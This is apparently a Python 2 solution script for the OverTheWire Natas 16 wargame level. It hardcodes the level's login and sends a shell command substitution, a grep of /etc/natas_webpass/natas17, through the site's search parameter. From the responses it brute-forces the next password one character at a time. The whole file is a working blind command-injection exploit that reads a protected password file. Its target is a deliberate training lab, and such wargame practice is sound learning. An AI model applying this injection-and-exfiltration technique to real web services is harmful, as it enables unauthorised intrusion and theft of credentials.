import subprocess as sp
import re

alphabet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

pre_request = "http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+-E+%5E"
post_request = ".*+%2Fetc%2Fnatas_webpass%2Fnatas17%29hackers&submit=Search"
auth = "natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

password = ""
for cur_index in xrange(0,32):
    prev_len = len(password)
    for char in alphabet:
        url = pre_request + password + char + post_request
        process = sp.Popen(["curl","-s", url, "--user", auth], stdout = sp.PIPE)
        out,err = process.communicate()
        if "hackers" not in out:
            password += char
            break
    if prev_len == len(password):
        print "Bad Alphabet, no character found"
        print (password + "\r")
    else:
        print (password + "\r")



